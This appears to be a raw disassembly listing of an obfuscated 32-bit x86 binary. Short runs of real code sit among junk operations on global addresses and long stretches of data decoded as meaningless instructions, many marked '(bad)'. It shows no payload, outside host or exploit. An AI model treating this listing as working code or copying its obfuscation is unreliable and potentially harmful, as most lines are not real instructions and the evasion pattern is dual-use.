  4072f2:	(bad)  
  4072f3:	int3   
  4072f4:	popa   
  4072f5:	adc    BYTE PTR [ecx+0x77],ah
  4072f8:	add    bl,BYTE PTR [edi-0x27]
  4072fb:	int    0x2d
  4072fd:	push   ss
  4072fe:	xor    DWORD PTR [eax+0x19c09744],0x69e9b32c
  407308:	push   cs
  407309:	fld    TBYTE PTR [edx+0x4c561d21]
  40730f:	sub    al,0xe7
  407311:	and    BYTE PTR [eax],dl
  407313:	mov    dl,BYTE PTR [ecx+ebp*1-0x25]
  407317:	inc    esp
  407318:	push   ss
  407319:	shl    DWORD PTR [edx],cl
  40731b:	rcl    eax,cl
  40731d:	jle    0x4072b4
  40731f:	pop    ebp
  407320:	loopne 0x40731e
  407322:	int3   
  407323:	mov    dh,0x8a
  407325:	sti    
  407326:	sti    
  407327:	pop    ss
  407328:	or     DWORD PTR [ebx+0x44],esp
  40732b:	rcl    BYTE PTR ds:0xbf03e441,cl
  407331:	add    DWORD PTR ds:0xafcfb890,edx
  407337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407338:	dec    eax
  407339:	push   edi
  40733a:	clc    
  40733b:	push   edi
  40733c:	(bad)  
  40733e:	mov    dl,0xef
  407340:	imul   edi,DWORD PTR [esi-0x43],0xc86e203
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	and    al,0xf8
  4073fd:	push   eax
  4073fe:	(bad)  
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	inc    esp
  407408:	xchg   edi,eax
  407409:	jb     0x40747f
  40740b:	xchg   ebx,eax
  40740c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40740d:	loope  0x4073b4
  40740f:	mov    esp,DWORD PTR [edx]
  407411:	neg    BYTE PTR [ebx+edi*1-0x1b]
  407415:	daa    
  407416:	dec    eax
  407417:	or     dl,al
  407419:	add    BYTE PTR [edi+0x7ecceb2e],0x35
  407420:	push   esi
  407421:	and    eax,0xbfe1210b
  407426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407427:	fcom   DWORD PTR [ebx+edx*8+0x1f]
  40742b:	sub    DWORD PTR [ecx-0x14c5f19c],esi
  407431:	lods   eax,DWORD PTR ds:[esi]
  407432:	and    DWORD PTR [esi+0x73],esi
  407435:	mov    edi,0x8228b280
  40743a:	in     al,0x39
  40743c:	aas    
  40743d:	sbb    al,0xd0
  40743f:	mov    edi,0x5db1da56
  407444:	loop   0x40744d
  407446:	vpmullw xmm4,xmm6,XMMWORD PTR [esi-0x622399f]
  40744e:	pop    eax
  40744f:	mov    ah,0x88
  407451:	daa    
  407452:	fdivr  st(7),st
  407454:	fsubr  st,st(3)
  407456:	mov    al,ds:0x90ffd550
  40745b:	sbb    ah,BYTE PTR [esi+0xad1b5dc]
  407461:	push   edx
  407462:	mov    ds:0x6bc9ba7c,eax
  407467:	(bad)  
  407468:	js     0x407494
  40746a:	(bad)  
  40746b:	pop    ss
  40746c:	xor    BYTE PTR [edi],dh
  40746e:	fidiv  WORD PTR [eax]
  407470:	pop    eax
  407471:	test   DWORD PTR [edx],ecx
  407473:	jmp    DWORD PTR [ebx]
  407475:	fstp   TBYTE PTR [bp+si]
  407478:	adc    bh,BYTE PTR [ecx+esi*1+0x2cf7815a]
  40747f:	jl     0x4074d7
  407481:	pop    ebx
  407482:	xor    bh,bh
  407484:	push   edx
  407485:	xchg   edi,eax
  407486:	leave  
  407487:	push   esp
  407488:	outs   dx,DWORD PTR ds:[esi]
  407489:	xchg   edx,eax
  40748a:	lods   al,BYTE PTR ds:[esi]
  40748b:	jbe    0x40743b
  40748d:	jbe    0x407457
  40748f:	mov    esp,?
  407491:	inc    esp
  407492:	mov    ch,BYTE PTR ds:0xebb6e767
  407498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407499:	clc    
  40749a:	fwait
  40749b:	dec    bl
  40749d:	mov    esi,0xbd655cc
  4074a2:	fild   QWORD PTR [edi]
  4074a4:	dec    eax
  4074a5:	push   edi
  4074a6:	pop    ss
  4074a7:	jmp    0xff92c144
  4074ac:	pop    eax
  4074ad:	cdq    
  4074ae:	in     al,dx
  4074af:	std    
  4074b0:	mov    cl,0x29
  4074b2:	mov    ebp,0x571399f4
  4074b7:	fiadd  DWORD PTR [edi-0x184ba711]
  4074bd:	mov    DWORD PTR [esi+0x60],edx
  4074c0:	jae    0x40744f
  4074c2:	call   0x3b00:0x24c5f836
  4074c9:	xchg   edx,eax
  4074ca:	mov    fs,WORD PTR [edx]
  4074cc:	push   ecx
  4074cd:	jmp    0x407501
  4074cf:	sbb    DWORD PTR [ebp+ebp*8+0x9],edx
  4074d3:	inc    edx
  4074d4:	fcomi  st,st(0)
  4074d6:	dec    esi
  4074d7:	icebp  
  4074d8:	mov    bh,dh
  4074da:	aam    0xaf
  4074dc:	inc    esp
  4074dd:	xor    cl,BYTE PTR [ecx+0x3]
  4074e0:	jl     0x4074b5
  4074e2:	bnd ret 
  4074e4:	pop    ebp
  4074e5:	sahf   
  4074e6:	mov    esi,0xa1bd1654
  4074eb:	or     DWORD PTR [ebp+eiz*8+0x43],edi
  4074ef:	loope  0x40749a
  4074f1:	adc    ebx,edx
  4074f3:	xchg   edx,eax
  4074f4:	out    dx,al
  4074f5:	fcom   DWORD PTR [esi-0x17ed021e]
  4074fb:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4074fd:	mov    bh,BYTE PTR ds:[edx+edx*1+0x5c]
  407502:	popa   
  407503:	(bad)  
  407504:	outs   dx,BYTE PTR ds:[esi]
  407505:	lods   al,BYTE PTR ds:[esi]
  407506:	add    DWORD PTR [edx],esp
  407508:	dec    ebp
  407509:	in     al,dx
  40750a:	repz lahf 
  40750c:	cwde   
  40750d:	jb     0x4074e8
  40750f:	sbb    BYTE PTR [eax+edi*4-0x46044271],dl
  407516:	fs rol bl,0xd1
  40751a:	push   cs
  40751b:	lock push esi
  40751d:	das    
  40751e:	mov    bh,0xb1
  407520:	dec    ecx
  407521:	push   edi
  407522:	push   edx
  407523:	ins    DWORD PTR es:[edi],dx
  407524:	lahf   
  407525:	stos   DWORD PTR es:[edi],eax
  407526:	xchg   ebp,eax
  407527:	repnz sub al,0x52
  40752a:	pop    ebx
  40752b:	mov    ah,0xc3
  40752d:	mov    eax,DWORD PTR [esi-0x24]
  407530:	jmp    0x40753f
  407532:	ins    DWORD PTR es:[edi],dx
  407533:	mov    DWORD PTR ds:0xc1b4fcc3,edi
  407539:	jmp    0xd5a8:0x2b7d26e1
  407540:	mov    ds:0xa390ce4e,al
  407545:	xchg   edx,eax
  407546:	loopne 0x4074c9
  407548:	inc    ebp
  407549:	enter  0xaf6c,0x4a
  40754d:	jg     0x407531
  40754f:	sbb    eax,0x9998e111
  407554:	out    0xe6,eax
  407556:	mov    ah,0xf2
  407558:	add    esp,DWORD PTR [eax-0x522c224d]
  40755e:	inc    eax
  40755f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  407561:	jns    0x407554
  407563:	xor    eax,0x4fc22be6
  407568:	add    cl,dh
  40756a:	out    0x5f,al
  40756c:	inc    esp
  40756d:	imul   eax,ebp,0xffffffea
  407570:	adc    eax,0xe1e94644
  407575:	or     eax,0xe77b7b6c
  40757a:	inc    ebx
  40757b:	mov    edi,0x7de4eecf
  407580:	xchg   esi,ecx
  407582:	xchg   ecx,eax
  407583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407584:	xor    dl,BYTE PTR [edx-0x526e67d]
  40758a:	(bad)  
  40758b:	out    0xf5,eax
  40758d:	stos   DWORD PTR es:[edi],eax
  40758e:	cwde   
  40758f:	test   DWORD PTR [edi],esp
  407591:	pushw  0x49
  407594:	inc    ebx
  407595:	outs   dx,BYTE PTR ds:[esi]
  407596:	test   eax,0x172edf64
  40759b:	aas    
  40759c:	pushf  
  40759d:	lds    esi,FWORD PTR [esi+0x25531ad9]
  4075a3:	jp     0x407584
  4075a5:	xor    bh,dl
  4075a7:	dec    ebp
  4075a8:	mov    DWORD PTR [eax+0x2ac5f650],ebx
  4075ae:	add    DWORD PTR [esi+0x66],ecx
  4075b1:	sub    al,0x2f
  4075b3:	adc    al,0xf2
  4075b5:	pop    es
  4075b6:	or     BYTE PTR [esi-0x5a],ch
  4075b9:	xchg   BYTE PTR [edi+0x11],bl
  4075bc:	push   ebp
  4075bd:	cs cmp al,0x84
  4075c0:	iret   
  4075c1:	js     0x4075b9
  4075c3:	pushf  
  4075c4:	or     bh,BYTE PTR [edx-0x53]
  4075c7:	jl     0x40758a
  4075c9:	inc    ebx
  4075ca:	xor    ebp,ebx
  4075cc:	xor    cl,ch
  4075ce:	push   ds
  4075cf:	xchg   edi,eax
  4075d0:	jecxz  0x40760c
  4075d2:	mov    ah,0xa9
  4075d4:	cs call 0x78fc:0x3ef0fcd1
  4075dc:	adc    eax,0xa1c73363
  4075e1:	pop    esp
  4075e2:	add    ah,BYTE PTR [ebp+0x47]
  4075e5:	xchg   ebp,eax
  4075e6:	leave  
  4075e7:	dec    edx
  4075e8:	pop    ds
  4075e9:	sub    BYTE PTR [ecx-0x1f],al
  4075ec:	mul    BYTE PTR [edx+0x4aa4691d]
  4075f2:	mov    bh,0x8c
  4075f4:	pushf  
  4075f5:	iret   
  4075f6:	dec    esi
  4075f7:	and    al,0xb4
  4075f9:	push   esp
  4075fa:	adc    eax,0xb30db600
  4075ff:	imul   esp,edx,0xa3c95cc9
  407605:	mov    esi,0xd86c4255
  40760b:	jmp    DWORD PTR [esp+eax*8-0x76bc6bd5]
  407612:	sub    esp,DWORD PTR [ebx]
  407614:	or     ebx,DWORD PTR [eax-0x53]
  407617:	mov    ah,0x2e
  407619:	sbb    esi,0x3a
  40761c:	mov    bl,0xfd
  40761e:	stc    
  40761f:	enter  0xfb09,0xfe
  407623:	mov    dh,0x48
  407625:	mov    ecx,0xa9e92d1d
  40762a:	cs (bad) 
  40762c:	mov    ds:0x67ef0d00,eax
  407631:	jns    0x407633
  407633:	sub    al,0x83
  407635:	inc    esi
  407636:	push   0xfffffff9
  407638:	or     BYTE PTR [eax+0xa],bl
  40763b:	in     eax,dx
  40763c:	sbb    eax,0xc88ca0e0
  407641:	pusha  
  407642:	adc    edx,edx
  407644:	xor    BYTE PTR [esi],0xb
  407647:	mov    esp,0x3d38988c
  40764c:	mov    bh,0xb7
  40764e:	dec    ebp
  40764f:	dec    sp
  407651:	cdq    
  407652:	jl     0x40766d
  407654:	neg    DWORD PTR [ebp-0x12]
  407657:	jecxz  0x40769b
  407659:	add    al,0x45
  40765b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40765c:	iret   
  40765d:	xchg   ebx,eax
  40765e:	push   0xe5edbd21
  407663:	jne    0x407656
  407665:	jae    0x407636
  407667:	xchg   DWORD PTR [ebx],edx
  407669:	(bad)  
  40766a:	xchg   ecx,eax
  40766b:	sar    DWORD PTR [ebp+0x17],1
  40766e:	and    eax,0x8b57cde1
  407673:	fwait
  407674:	lahf   
  407675:	hlt    
  407676:	push   edx
  407677:	cmp    eax,0xa89773f8
  40767c:	inc    esp
  40767d:	in     eax,dx
  40767e:	pop    eax
  40767f:	(bad)
  407682:	adc    DWORD PTR [esi-0x5e0758b2],eax
  407688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407689:	cld    
  40768a:	xlat   BYTE PTR ds:[ebx]
  40768b:	fcom   DWORD PTR [edi+ebp*4+0x7b80650]
  407692:	mov    edx,0x16a5f46b
  407697:	clc    
  407698:	mov    bh,BYTE PTR [esi+0x3bc41a33]
  40769e:	subps  xmm0,XMMWORD PTR [edx+0xc]
  4076a2:	es out dx,eax
  4076a4:	mov    esp,0x41ce3569
  4076a9:	mov    ds:0xefc94433,al
  4076ae:	popf   
  4076af:	(bad)  
  4076b0:	xchg   ebx,eax
  4076b1:	lods   al,BYTE PTR ds:[esi]
  4076b2:	jo     0x40772f
  4076b4:	xchg   ebx,eax
  4076b5:	dec    edx
  4076b6:	fisub  DWORD PTR [edi-0x66]
  4076b9:	pop    eax
  4076ba:	ret    0xa48c
  4076bd:	loope  0x407689
  4076bf:	mov    edi,0x59cbc6c
  4076c4:	xchg   ebx,eax
  4076c5:	loop   0x407659
  4076c7:	in     al,0x30
  4076c9:	pop    ds
  4076ca:	or     cl,ch
  4076cc:	out    dx,eax
  4076cd:	sub    al,0x7c
  4076cf:	lods   eax,DWORD PTR ds:[esi]
  4076d0:	or     eax,0xc613f138
  4076d5:	jl     0x40769f
  4076d7:	das    
  4076d8:	int3   
  4076d9:	jno    0x40765c
  4076db:	addr16 inc eax
  4076dd:	shl    edi,0xae
  4076e0:	pop    ecx
  4076e1:	aad    0xc9
  4076e3:	mov    ds:0xebe2d689,al
  4076e8:	push   edx
  4076e9:	mov    edx,0xf4e97cfb
  4076ee:	xchg   DWORD PTR ds:[eax+ecx*8],ebx
  4076f2:	loopne 0x407687
  4076f4:	or     ah,BYTE PTR [eax-0x45619b85]
  4076fa:	daa    
  4076fb:	stc    
  4076fc:	(bad)  
  4076fe:	das    
  4076ff:	add    al,0x6d
  407702:	mov    bl,0x71
  407704:	in     al,dx
  407705:	jnp    0x4076c1
  407707:	test   DWORD PTR [edi],esi
  407709:	mov    ds:0x76ea73c3,al
  40770e:	call   0xbd9af027
  407713:	mov    ecx,0xf5d8476
  407718:	mov    bl,0xda
  40771a:	ror    al,0x37
  40771d:	pop    es
  40771e:	dec    esp
  40771f:	adc    eax,0xb58b2f2b
  407724:	loope  0x4076a9
  407726:	aaa    
  407727:	jp     0x4076c4
  407729:	neg    bh
  40772b:	gs ja  0x40779d
  40772e:	dec    ebp
  40772f:	dec    ebp
  407730:	sbb    al,0xea
  407732:	jecxz  0x4076b8
  407734:	fnsave [esi]
  407736:	xchg   ebp,eax
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	repnz popa 
  4077db:	and    cl,bh
  4077dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x407766
  4077e6:	or     DWORD PTR [edx-0x66e19a44],ebx
  4077ec:	inc    edx
  4077ed:	in     eax,0x55
  4077ef:	xchg   edi,eax
  4077f0:	and    ebx,eax
  4077f2:	adc    edx,DWORD PTR [edx+0x9]
  4077f5:	jl     0x40781b
  4077f7:	bnd je 0x40784e
  4077fa:	rcl    BYTE PTR [ecx+0xabd59ba],0x23
  407801:	arpl   WORD PTR [edx+0x90f70fc],di
  407807:	ins    BYTE PTR es:[edi],dx
  407808:	ret    
  407809:	xchg   BYTE PTR [eax+edx*2+0x4a],ch
  40780d:	addr16 mov ecx,0x51fa3c65
  407813:	sbb    DWORD PTR [ebp-0x32a29d8],ebx
  407819:	cmp    al,0xd3
  40781b:	add    eax,0x50ddd99d
  407820:	fadd   QWORD PTR [eax-0x75]
  407823:	hlt    
  407824:	stos   BYTE PTR es:[edi],al
  407825:	cs jl  0x407888
  407828:	aas    
  407829:	or     ebx,0x65
  40782c:	sbb    al,0xa9
  40782e:	(bad)  
  40782f:	(bad)  
  407830:	dec    edi
  407831:	cmp    BYTE PTR [edx+0x5068c822],0x30
  407838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407839:	fcmovnbe st,st(0)
  40783b:	int    0x63
  40783d:	cs mov edi,DWORD PTR gs:[ecx]
  407841:	pop    ecx
  407842:	idiv   bh
  407844:	cld    
  407845:	push   esp
  407846:	lods   eax,DWORD PTR cs:[esi]
  407848:	and    DWORD PTR [esi],esi
  40784a:	or     BYTE PTR [edi+0x4d],cl
  40784d:	sub    al,0x62
  40784f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407850:	sahf   
  407851:	mov    ah,0xd1
  407853:	xchg   ebx,eax
  407854:	dec    eax
  407855:	adc    eax,0x53bbc130
  40785a:	jle    0x4077f4
  40785c:	dec    edi
  40785d:	jmp    0x370eea7d
  407862:	cmc    
  407863:	stos   DWORD PTR es:[edi],eax
  407864:	push   ebx
  407865:	call   0x2714e3d3
  40786a:	retf   
  40786b:	or     eax,0x97d77860
  407870:	ss into 
  407872:	pop    edx
  407873:	and    cl,dh
  407875:	adc    ebp,esi
  407877:	push   esi
  407878:	jmp    0x407832
  40787a:	mov    dl,0x31
  40787c:	add    dl,BYTE PTR [ebx+0x0]
  40787f:	or     BYTE PTR [edi+0x14],ch
  407882:	stos   BYTE PTR es:[edi],al
  407883:	and    ch,BYTE PTR [ecx+eiz*1-0x3f]
  407887:	add    DWORD PTR [edx+0x71456319],edx
  40788d:	fs or  esi,edx
  407890:	aas    
  407891:	addr16 xchg esi,eax
  407893:	add    BYTE PTR [edx-0x6b],ch
  407896:	cdq    
  407897:	mov    edx,0xcb856256
  40789c:	std    
  40789d:	dec    esi
  40789e:	mov    al,ds:0xaabdfe7f
  4078a3:	imul   edi,ebx,0x61762b37
  4078a9:	and    al,0xec
  4078ab:	cmp    bh,BYTE PTR [esi]
  4078ad:	adc    esp,DWORD PTR [esp+esi*8+0x3a]
  4078b1:	arpl   di,sp
  4078b3:	mov    dl,0x5d
  4078b5:	ins    BYTE PTR es:[edi],dx
  4078b6:	fldcw  WORD PTR [ebp-0xf]
  4078b9:	ror    BYTE PTR [edi+0x6fba324c],0xa3
  4078c0:	lds    eax,FWORD PTR [ebp+edi*2+0x7c]
  4078c4:	xor    al,0x19
  4078c6:	cmp    BYTE PTR [edi],bl
  4078c8:	pop    esi
  4078c9:	ret    0x3ec2
  4078cc:	addr16 pop edi
  4078ce:	dec    ecx
  4078cf:	into   
  4078d0:	mov    ?,WORD PTR [eax]
  4078d2:	fbstp  TBYTE PTR [ebx-0x30]
  4078d5:	dec    ecx
  4078d6:	add    ebp,DWORD PTR [ecx+0x75]
  4078d9:	mov    WORD PTR [ebp-0x1bb73a12],es
  4078df:	mov    ch,0xa7
  4078e1:	add    dl,BYTE PTR [edi]
  4078e3:	loop   0x4078fe
  4078e5:	icebp  
  4078e6:	aad    0x19
  4078e8:	js     0x407961
  4078ea:	jbe    0x407941
  4078ec:	cmc    
  4078ed:	adc    cl,BYTE PTR [eax+0x8]
  4078f0:	les    esp,FWORD PTR [eax+0x5d]
  4078f3:	cmp    ch,BYTE PTR [ecx+0x49]
  4078f6:	dec    ebx
  4078f7:	jbe    0x4078fe
  4078f9:	add    al,0x2b
  4078fb:	push   cs
  4078fc:	ret    
  4078fd:	xchg   edx,eax
  4078fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078ff:	push   cs
  407900:	push   es
  407901:	int    0x74
  407903:	and    al,0xba
  407905:	dec    edi
  407906:	call   0xc401:0xf79f94f2
  40790d:	sti    
  40790e:	push   edi
  40790f:	seto   BYTE PTR [eax]
  407912:	test   al,0xcb
  407914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407915:	mov    esi,esi
  407917:	pop    esp
  407918:	and    eax,0xbe2383be
  40791d:	dec    ecx
  40791e:	mov    ah,BYTE PTR [eax-0x5067baaa]
  407924:	scas   al,BYTE PTR es:[edi]
  407925:	add    bl,BYTE PTR [esp+ecx*4+0x4ae6d602]
  40792c:	neg    BYTE PTR [esi]
  40792e:	fs jmp 0x4babdba
  407934:	or     DWORD PTR [edx+0x16],eax
  407937:	ds mov edi,0x41001673
  40793d:	test   eax,0x5b9a98be
  407942:	pop    ss
  407943:	mov    dh,0x62
  407945:	pop    ebx
  407946:	cli    
  407947:	cmp    al,0xcb
  407949:	lds    esp,FWORD PTR [ebp-0x70]
  40794c:	fbld   TBYTE PTR [eax+0x20]
  40794f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407950:	sub    BYTE PTR [esi],0x5e
  407953:	cs push 0xffffff8f
  407956:	jle    0x407967
  407958:	pop    esi
  407959:	or     eax,0x77b171d7
  40795e:	jge    0x40790f
  407960:	fiadd  WORD PTR [ecx]
  407962:	in     al,dx
  407963:	lds    edx,FWORD PTR [ecx]
  407965:	push   0x2f
  407967:	scas   al,BYTE PTR es:[edi]
  407968:	pop    esp
  407969:	(bad)  
  40796a:	dec    ebx
  40796b:	pop    ss
  40796c:	jo     0x4079bc
  40796e:	fsub   QWORD PTR [edi]
  407970:	jnp    0x40794a
  407972:	icebp  
  407973:	xlat   BYTE PTR ds:[ebx]
  407974:	pop    ebp
  407975:	loop   0x4079c3
  407977:	fdiv   QWORD PTR [eax+0x57]
  40797a:	push   fs
  40797c:	push   0x4a5fbda8
  407981:	mov    gs,WORD PTR [edx-0x5e0b6c83]
  407987:	jno    0x407936
  407989:	lds    ecx,FWORD PTR [ebx+0x1f]
  40798c:	in     al,dx
  40798d:	adc    eax,0x3e76ebf4
  407992:	or     bl,BYTE PTR [edi]
  407994:	arpl   di,sp
  407996:	xchg   esi,eax
  407997:	cmp    DWORD PTR [ecx],ebp
  407999:	add    bh,dl
  40799b:	xchg   edi,eax
  40799c:	mov    ch,0x14
  40799e:	xor    al,0xe
  4079a0:	push   edx
  4079a1:	jo     0x4079d6
  4079a3:	call   0x8be9:0xdcac4cc9
  4079aa:	mov    dl,0x26
  4079ac:	cmc    
  4079ad:	jb     0x407976
  4079af:	inc    edi
  4079b0:	ds jge 0x4079a9
  4079b3:	cmp    esi,0xffffffc2
  4079b6:	arpl   WORD PTR [esi-0x1d],cx
  4079b9:	sti    
  4079ba:	mov    al,0x62
  4079bc:	mov    BYTE PTR [eax*1-0x5bd04dd6],dl
  4079c3:	in     eax,dx
  4079c4:	pop    ds
  4079c5:	dec    edi
  4079c6:	or     DWORD PTR [eax-0xd],ebx
  4079c9:	mov    ebp,DWORD PTR [ebx]
  4079cb:	mov    ah,0xb1
  4079cd:	pop    gs
  4079cf:	sti    
  4079d0:	jne    0x4079e2
  4079d2:	jge    0x407a12
  4079d4:	or     ebx,DWORD PTR ds:0x61ee0136
  4079da:	xchg   DWORD PTR [edx],ecx
  4079dc:	xchg   edx,eax
  4079dd:	popf   
  4079de:	sbb    bh,BYTE PTR [esi+ebp*2-0x7e7922a3]
  4079e5:	ja     0x407a27
  4079e7:	test   BYTE PTR [esi+0x5a41775c],ah
  4079ed:	and    eax,0x4472ce43
  4079f2:	pusha  
  4079f3:	sub    edi,DWORD PTR [edx+0x38]
  4079f6:	cdq    
  4079f7:	outs   dx,BYTE PTR ds:[esi]
  4079f8:	test   eax,0xada4d81b
  4079fe:	pop    ebx
  4079ff:	loope  0x407a19
  407a01:	loope  0x407a32
  407a03:	mov    dh,0xe4
  407a05:	mov    gs,WORD PTR [edi+ecx*4+0x71]
  407a09:	adc    ebp,ecx
  407a0b:	neg    BYTE PTR [ecx-0x4b]
  407a0e:	sub    al,0x81
  407a10:	sbb    BYTE PTR [edi-0x3b],bh
  407a13:	cmp    eax,0xf618532a
  407a19:	stc    
  407a1a:	jp     0x407a7f
  407a1c:	or     BYTE PTR [esi+0x56],ah
  407a1f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a21:	into   
  407a22:	in     eax,0x59
  407a24:	mov    BYTE PTR [edi+edi*2-0x3a],bh
  407a28:	es inc esi
  407a2a:	mov    dh,0x1d
  407a2c:	or     ch,bh
  407a2e:	sbb    cl,BYTE PTR ds:0x78daa84b
  407a34:	sub    edx,ebp
  407a36:	mov    ds:0x5fa7cd80,al
  407a3b:	inc    ebp
  407a3c:	adc    edx,DWORD PTR [esi-0x6ba2bb5e]
  407a42:	jle    0x407a47
  407a44:	pusha  
  407a45:	mov    edx,0xb3c9ace0
  407a4a:	pop    ebp
  407a4b:	es stc 
  407a4d:	jno    0x407a13
  407a4f:	into   
  407a50:	inc    ebx
  407a51:	or     eax,0xf8ace32
  407a56:	inc    eax
  407a57:	xor    DWORD PTR [eax-0x16ebd9de],0xf27d3b6
  407a61:	push   eax
  407a62:	push   ds
  407a63:	add    ah,BYTE PTR [ebp-0x4]
  407a66:	and    al,0x60
  407a68:	push   ecx
  407a69:	das    
  407a6a:	or     ecx,DWORD PTR [ebp-0x71c3e933]
  407a70:	dec    edi
  407a71:	dec    esi
  407a72:	call   0x46b9:0xef7cdf98
  407a79:	inc    edi
  407a7a:	mov    ds:0x344b734f,al
  407a7f:	sti    
  407a80:	jnp    0x407a98
  407a82:	or     al,0xa6
  407a84:	int3   
  407a85:	ja     0x407ada
  407a87:	rcr    DWORD PTR [esp+ebx*8-0x2df55d79],0x6a
  407a8f:	jno    0x407a39
  407a91:	popf   
  407a92:	sbb    edx,eax
  407a94:	nop
  407a95:	ror    ebx,cl
  407a97:	sub    DWORD PTR [edi],0xca9ff608
  407a9d:	jle    0x407a5d
  407a9f:	cwde   
  407aa0:	cmp    DWORD PTR [eax+0x70de4cc8],esi
  407aa6:	cmp    esi,DWORD PTR [eax+eax*4-0x4c]
  407aaa:	sbb    al,0x18
  407aac:	push   esi
  407aad:	xor    eax,0x11d08c21
  407ab2:	push   si
  407ab4:	mov    edi,0x2196b9d1
  407ab9:	mov    edx,0x3e091b6c
  407abe:	xor    ecx,DWORD PTR [eax+eiz*4]
  407ac1:	cld    
  407ac2:	mov    esp,0xe4f76f8d
  407ac7:	fild   QWORD PTR [ebx]
  407ac9:	repz and cl,BYTE PTR [edx]
  407acc:	imul   ebx,DWORD PTR ds:0x4e7097fe,0x7c97e008
  407ad6:	rcr    DWORD PTR [ecx-0x36],cl
  407ad9:	test   ch,0x24
  407adc:	out    0xad,eax
  407ade:	aaa    
  407adf:	jg     0x407abb
  407ae1:	jns    0x407b12
  407ae3:	mov    esp,0x42f92ad2
  407ae8:	adc    BYTE PTR [ebx*8-0x263d4c4c],ah
  407aef:	or     ah,bh
  407af1:	xchg   ecx,eax
  407af2:	in     eax,dx
  407af3:	gs clc 
  407af5:	jno    0x407a99
  407af7:	sub    bh,BYTE PTR [edx+edx*2-0x6f]
  407afb:	lahf   
  407afc:	inc    eax
  407afd:	call   FWORD PTR [edx-0x19]
  407b00:	and    ecx,DWORD PTR [ebx]
  407b02:	gs fst QWORD PTR es:[ebp-0x23]
  407b07:	test   al,0x86
  407b09:	jno    0x407b66
  407b0b:	jle    0x407ae9
  407b0d:	jns    0x407b47
  407b0f:	cmp    WORD PTR [esi+0x48],bp
  407b13:	int    0xe2
  407b15:	xor    eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
